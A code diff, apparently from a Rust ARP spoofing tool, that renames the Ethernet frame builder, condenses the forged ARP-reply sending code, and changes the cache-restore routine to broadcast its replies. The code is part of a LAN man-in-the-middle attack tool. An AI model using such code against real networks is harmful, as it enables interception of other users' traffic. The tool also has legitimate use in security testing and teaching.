@@ -33,14 +33,14 @@ fn build_arp_packet(
     a_packet.packet_mut().to_owned()
 }
 
-fn build_ethernet_packet(host_mac: MacAddr, target_mac: MacAddr, arp_packet: &Vec<u8>) -> Vec<u8> {
+fn build_ethernet_frame(host_mac: MacAddr, target_mac: MacAddr, arp_packet: &Vec<u8>) -> Vec<u8> {
     let mut e_buffer = [0u8; 42];
-    let mut e_packet = MutableEthernetPacket::new(&mut e_buffer).unwrap();
-    e_packet.set_destination(target_mac);
-    e_packet.set_source(host_mac);
-    e_packet.set_ethertype(EtherTypes::Arp);
-    e_packet.set_payload(&arp_packet);
-    e_packet.packet().to_owned()
+    let mut e_frame = MutableEthernetPacket::new(&mut e_buffer).unwrap();
+    e_frame.set_destination(target_mac);
+    e_frame.set_source(host_mac);
+    e_frame.set_ethertype(EtherTypes::Arp);
+    e_frame.set_payload(&arp_packet);
+    e_frame.packet().to_owned()
 }
 
 fn get_interface(iface_name: &str) -> NetworkInterface {
@@ -58,39 +58,34 @@ fn send_arp_reply(
     target_ip: Ipv4Addr,
     target_mac: MacAddr,
 ) {
-    let arp_packet = build_arp_packet(
-        ArpOperations::Reply, // ArpOperations::[ Request , Reply ]
-        src_ip,
-        src_mac,
-        target_ip,
-        target_mac,
-    );
-    let ethernet_packet = build_ethernet_packet(src_mac, target_mac, &arp_packet);
-    tx.send_to(&ethernet_packet, None);
+    let arp_packet = build_arp_packet(ArpOperations::Reply, src_ip, src_mac, target_ip, target_mac);
+    let ethernet_frame = build_ethernet_frame(src_mac, target_mac, &arp_packet);
+    tx.send_to(&ethernet_frame, None);
     println!("{}, {} is at {}", target_mac, src_ip, src_mac);
 }
 
 fn restore_table(params: &config::Params, tx: &mut Box<dyn pnet::datalink::DataLinkSender>) {
+    let broadcast = MacAddr(0xff, 0xff, 0xff, 0xff, 0xff, 0xff);
     send_arp_reply(
         tx,
         params.host_ip,
         params.host_mac,
         params.gateway_ip,
-        params.gateway_mac,
+        broadcast,
     );
     send_arp_reply(
         tx,
         params.target_ip,
         params.target_mac,
         params.gateway_ip,
-        params.gateway_mac,
+        broadcast,
     );
     send_arp_reply(
         tx,
         params.gateway_ip,
         params.gateway_mac,
         params.target_ip,
-        params.target_mac,
+        broadcast,
     );
     thread::sleep(Duration::from_secs(1));
 }
@@ -98,8 +93,6 @@ fn restore_table(params: &config::Params, tx: &mut Box<dyn pnet::datalink::DataL
 fn main() {
     let params = cli::command_line_start();
     let interface = get_interface(&params.interface);
-    println!("Source MAC address: {}", params.host_mac);
-    println!("Source IP address:  {}", params.host_ip);
 
     let (mut tx, _) = match channel(&interface, Default::default()) {
         Ok(Channel::Ethernet(tx, rx)) => (tx, rx),
